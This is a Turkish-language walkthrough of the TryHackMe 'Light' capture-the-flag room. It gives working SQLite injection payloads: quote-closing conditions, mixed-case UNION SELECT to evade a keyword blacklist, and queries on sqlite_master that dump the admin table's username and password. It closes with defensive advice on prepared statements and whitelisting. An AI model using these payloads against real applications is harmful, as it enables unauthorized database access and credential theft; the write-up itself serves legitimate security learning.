# TryHackMe: Light — SQLite Injection ile Veritabanını Boşaltmak

Siber güvenlik tarafına geçiş yapan bir yazılımcıyım. Bu makine, bir veritabanı uygulamasındaki SQL injection açığını kullanarak admin bilgilerini ve flag'i çektiğim bir CTF.

## Keşif Yapma

Nmap ile tarama yaptım ama host ping'e cevap vermedi, `-Pn` ekleyince sadece tek bir port buldum:

- **53 (TCP)** — tcpwrapped

Port 53 normalde DNS'tir ama burada farklı bir şey döndü. Odanın açıklamasında asıl uygulamanın **port 1337**'de çalıştığı ve `smokey` kullanıcı adıyla başlayabileceğim yazıyordu.

## Uygulamaya Bağlanma

Netcat ile bağlandım:

```
nc HEDEF_IP 1337
```

Uygulama bir kullanıcı adı istiyor. `smokey` yazdığımda şifresini döndürdü: `vYQ5ngPpw8AdUmL`. Ama asıl hedef admin kullanıcısını bulmak.

## SQL Injection ile Filtre Atlatma

Klasik `' OR 1=1--` denedim ama uygulama `--`, `/*` ve `%0b` karakterlerini engelliyordu. Yorum karakteri kullanamıyorsam tırnağı doğal kapatırım:

```
' OR '1'='1
```

Bu çalıştı ve farklı bir şifre döndürdü. Sonra `UNION SELECT` denedim ama `UNION` kelimesi de engellenmişti. Büyük/küçük harf karıştırarak filteyi atlattım:

```
' uNiOn SeLeCt ...
```

Bu bypass çalıştı. Uygulama SQLite kullanıyordu, tablo bilgilerini `sqlite_master`'dan çektim.

## Veritabanı Keşfi

Önce tablo adlarını buldum:

```
' uNiOn SeLeCt tbl_name FROM sqlite_master WHERE '1'='1
```

İki tablo çıktı: `admintable` ve `usertable`. Sonra `admintable`'ın yapısını çektim:

```
' uNiOn SeLeCt sql FROM sqlite_master WHERE tbl_name='admintable' AND '1'='1
```

Sütunlar: `id`, `username`, `password`. Buradan admin bilgilerini ve flag'i çektim:

```
' uNiOn SeLeCt username FROM admintable WHERE '1'='1
→ TryHackMeAdmin

' uNiOn SeLeCt password FROM admintable WHERE username='TryHackMeAdmin' AND '1'='1
→ mamZtAuMlrsEy5bp6q17
```

## Kapanış ve Geliştirici Gözünden

Bu makinede girdi filtreleme var ama yetersiz — sadece belirli kelimeleri ve karakterleri engelliyor, case-insensitive kontrol yapmıyor. Veritabanı sorgu sonuçları doğrudan kullanıcıya döndürülüyor.

Bir yazılımcı olarak bu açıkların nasıl önlenebileceğine bakmak istiyorum:

- **Prepared Statements:** Kullanıcı girdisi SQL sorgusuna doğrudan eklenmemeli. Parametreli sorgular (prepared statements) kullanılmalı — bu SQLi'nin tek gerçek çözümü.
- **Blacklist Yerine Whitelist:** Belirli kelimeleri engellemek (blacklist) her zaman atlatılabilir — case bypass, encoding, double writing gibi tekniklerle. Bunun yerine sadece izin verilen karakterleri kabul et (whitelist).
- **Hata Mesajlarını Gizle:** Uygulama tablo yapısını ve SQL hatalarını doğrudan döndürüyor. Production'da bu bilgiler kullanıcıya gösterilmemeli.
